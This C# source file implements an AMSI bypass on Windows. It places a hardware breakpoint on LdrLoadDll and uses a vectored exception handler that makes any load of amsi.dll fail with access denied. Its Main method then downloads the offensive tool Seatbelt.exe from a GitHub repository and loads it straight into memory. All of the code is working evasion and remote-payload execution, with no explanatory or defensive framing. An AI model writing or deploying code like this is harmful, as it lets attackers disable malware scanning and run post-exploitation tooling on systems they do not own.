using System;
using System.Net.Http;
using System.Reflection;
using System.Runtime.InteropServices;


namespace HWLdrLoadDll
{
    internal class Program
    {
        private static IntPtr hLdrLoadDll = IntPtr.Zero;
        static void Main(string[] args)
        {
            IntPtr hNtdll = Native.LoadLibrary("Ntdll.dll");
            hLdrLoadDll = Native.GetProcAddress(hNtdll,"LdrLoadDll");
            InitExceptionHandler();
            AddHardwareBreakPoint(hLdrLoadDll,0);
            var bytes = new HttpClient()
                .GetByteArrayAsync("https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/refs/heads/master/Seatbelt.exe")
                .Result;
            var asm = Assembly.Load(bytes);
            Console.WriteLine("Loaded -> {0}",asm.FullName);
        }
        internal static void InitExceptionHandler() 
        
        {
            //Get method info of the handler function
            MethodInfo method = typeof(Program)
                .GetMethod(nameof(Handler), BindingFlags.Static | BindingFlags.NonPublic);

            //Add our Exception Handler
            var lib  = Native.AddVectoredExceptionHandler(1, method.MethodHandle.GetFunctionPointer());

        }
        internal static long Handler(ref Native.ExceptionPointers ep)
        {
            var exception = Marshal.PtrToStructure<Native.ExceptionRecord>(ep.pExceptionRecord);
            var context = Marshal.PtrToStructure<Native.Context64>(ep.pContextRecord);
            if (exception.ExceptionCode == Native.EXCEPTION_SINGLE_STEP 
                && exception.ExceptionAddress == hLdrLoadDll)
            {
                try
                {
                    var dllName = Marshal
                      .PtrToStructure<Native.UnicodeString>((IntPtr)context.R8)
                      .ToString();
                    if (dllName
                        .IndexOf("amsi.dll", StringComparison.OrdinalIgnoreCase) >= 0)
                    {
                        //read reutrn address from stack pointer
                        ulong returnAddress = (ulong)Marshal.ReadInt64((IntPtr)context.Rsp);
                        //set address in Instruction pointer
                        context.Rip = returnAddress;
                        //Manully poping the return address from stack
                        context.Rsp += 8;
                        //Return NTStatus Access Denied
                        context.Rax = Native.STATUS_ACCESS_DENIED;
                    }
                }
                catch (Exception)
                {

                }
              
                //Continue execution
                context.EFlags |= (1 << 16);
                //Reflect context changes in memory
                Marshal.StructureToPtr(context, ep.pContextRecord, true); 
                return Native.EXCEPTION_CONTINUE_EXECUTION;
            }
            return Native.EXCEPTION_CONTINUE_SEARCH;
        }

        internal static void AddHardwareBreakPoint(IntPtr hLdrLoadDll, uint index)
        {
            var hThread = Native.GetCurrentThread();

            var ctx = new Native.Context64 { ContextFlags = Native.CONTEXT64_FLAGS.CONTEXT64_ALL};
            var output = Native.GetThreadContext(hThread,ref ctx);
            EnableBreakpoint(ref ctx,(ulong)hLdrLoadDll.ToInt64(),index);
            output =  Native.SetThreadContext(hThread,ref ctx);
        }
        public static void EnableBreakpoint(ref Native.Context64 ctx, ulong address, uint index)
        {

            switch (index)
            {
                case 0:
                    ctx.Dr0 = address;
                    break;
                case 1:
                    ctx.Dr1 = address;
                    break;
                case 2:
                    ctx.Dr2 = address;
                    break;
                case 3:
                    ctx.Dr3 = address;
                    break;
            }
            ctx.Dr7 &= ~(3UL << (16 + 4 * ((int)index)));
            ctx.Dr7 &= ~(3UL << (18 + 4 * ((int)index)));
            ctx.Dr7 |= 1UL << (2 * ((int)index));

        }
        public static void DisableBreakpoint(ref Native.Context64 ctx, ulong ulAddress, uint index)
        {

            if (ctx.Dr0 == ulAddress)
            {
                ctx.Dr0 = 0;

            }
            else if (ctx.Dr1 == ulAddress)
            {
                ctx.Dr1 = 0;
            }
            else if (ctx.Dr2 == ulAddress)
            {
                ctx.Dr2 = 0;
            }
            else if (ctx.Dr3 == ulAddress)
            {
                ctx.Dr3 = 0;
            }
            if (index > 0 && index < 4)
            {
                ctx.Dr7 &= ~(1UL << (2 * ((int)index)));
            }
        }


    }
    internal class Native 
    {

        internal const uint EXCEPTION_SINGLE_STEP = 0x80000004;
        internal const int EXCEPTION_CONTINUE_SEARCH = 0;
        internal const int EXCEPTION_CONTINUE_EXECUTION = -1;
        internal const ulong STATUS_ACCESS_DENIED = 0xC0000022;

        [DllImport("Kernel32.dll")]
        internal static extern IntPtr AddVectoredExceptionHandler(uint First, IntPtr Handler);

        [DllImport("kernel32.dll", SetLastError = true)]
        internal static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Ansi)]
        internal static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)] string lpFileName);
        [DllImport("kernel32.dll", SetLastError = true)]
        internal static extern bool SetThreadContext(IntPtr hThread, IntPtr lpContext);

        [DllImport("kernel32.dll", SetLastError = true)]
        internal static extern bool SetThreadContext(IntPtr hThread, ref Context64 lpContext);
        [DllImport("kernel32.dll", SetLastError = true)]
        internal static extern bool GetThreadContext(IntPtr hThread, IntPtr lpContext);
        [DllImport("kernel32.dll")]
        internal static extern IntPtr GetCurrentThread();
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool GetThreadContext(IntPtr hThread, ref Context64 lpContext);
        [StructLayout(LayoutKind.Sequential)]
        internal struct ExceptionPointers
        {
            public IntPtr pExceptionRecord;
            public IntPtr pContextRecord;
        }
        [StructLayout(LayoutKind.Sequential)]
        internal struct ExceptionRecord
        {
            public uint ExceptionCode;
            public uint ExceptionFlags;
            public IntPtr Exception;
            public IntPtr ExceptionAddress;
            public uint NumberParameters;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 15, ArraySubType = UnmanagedType.U4)] public uint[] ExceptionInformation;
        }

        [Flags]
        internal enum CONTEXT64_FLAGS : uint
        {
            CONTEXT64_AMD64 = 0x100000,
            CONTEXT64_CONTROL = CONTEXT64_AMD64 | 0x01,
            CONTEXT64_INTEGER = CONTEXT64_AMD64 | 0x02,
            CONTEXT64_SEGMENTS = CONTEXT64_AMD64 | 0x04,
            CONTEXT64_FLOATING_POINT = CONTEXT64_AMD64 | 0x08,
            CONTEXT64_DEBUG_REGISTERS = CONTEXT64_AMD64 | 0x10,
            CONTEXT64_FULL = CONTEXT64_CONTROL | CONTEXT64_INTEGER | CONTEXT64_FLOATING_POINT,
            CONTEXT64_ALL = CONTEXT64_CONTROL | CONTEXT64_INTEGER | CONTEXT64_SEGMENTS | CONTEXT64_FLOATING_POINT | CONTEXT64_DEBUG_REGISTERS
        }
        [StructLayout(LayoutKind.Sequential)]
        internal struct M128A
        {
            public ulong High;
            public long Low;

            public override string ToString()
            {
                return string.Format("High:{0}, Low:{1}", this.High, this.Low);
            }
        }

        /// <summary>
        /// x64
        /// </summary>
        [StructLayout(LayoutKind.Sequential, Pack = 16)]
        internal struct XSAVE_FORMAT64
        {
            public ushort ControlWord;
            public ushort StatusWord;
            public byte TagWord;
            public byte Reserved1;
            public ushort ErrorOpcode;
            public uint ErrorOffset;
            public ushort ErrorSelector;
            public ushort Reserved2;
            public uint DataOffset;
            public ushort DataSelector;
            public ushort Reserved3;
            public uint MxCsr;
            public uint MxCsr_Mask;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
            public M128A[] FloatRegisters;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
            public M128A[] XmmRegisters;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 96)]
            public byte[] Reserved4;
        }

        /// <summary>
        /// x64
        /// </summary>
        [StructLayout(LayoutKind.Sequential, Pack = 16)]
        internal struct Context64
        {
            public ulong P1Home;
            public ulong P2Home;
            public ulong P3Home;
            public ulong P4Home;
            public ulong P5Home;
            public ulong P6Home;

            public CONTEXT64_FLAGS ContextFlags;
            public uint MxCsr;

            public ushort SegCs;
            public ushort SegDs;
            public ushort SegEs;
            public ushort SegFs;
            public ushort SegGs;
            public ushort SegSs;
            public uint EFlags;

            public ulong Dr0;
            public ulong Dr1;
            public ulong Dr2;
            public ulong Dr3;
            public ulong Dr6;
            public ulong Dr7;

            public ulong Rax;
            public ulong Rcx;
            public ulong Rdx;
            public ulong Rbx;
            public ulong Rsp;
            public ulong Rbp;
            public ulong Rsi;
            public ulong Rdi;
            public ulong R8;
            public ulong R9;
            public ulong R10;
            public ulong R11;
            public ulong R12;
            public ulong R13;
            public ulong R14;
            public ulong R15;
            public ulong Rip;

            public XSAVE_FORMAT64 DUMMYUNIONNAME;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 26)]
            public M128A[] VectorRegister;
            public ulong VectorControl;

            public ulong DebugControl;
            public ulong LastBranchToRip;
            public ulong LastBranchFromRip;
            public ulong LastExceptionToRip;
            public ulong LastExceptionFromRip;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        internal struct UnicodeString
        {
            public ushort Length;
            public ushort MaximumLength;
            public IntPtr Buffer;
            public UnicodeString(string s)
            {
                Length = (ushort)(s.Length * 2);
                MaximumLength = (ushort)((s.Length + 1) * 2); // +1 for null terminator
                Buffer = Marshal.StringToHGlobalUni(s);
            }

            public override string ToString()
            {
                return Marshal.PtrToStringUni(Buffer, Length / 2);
            }
        }
    }

}
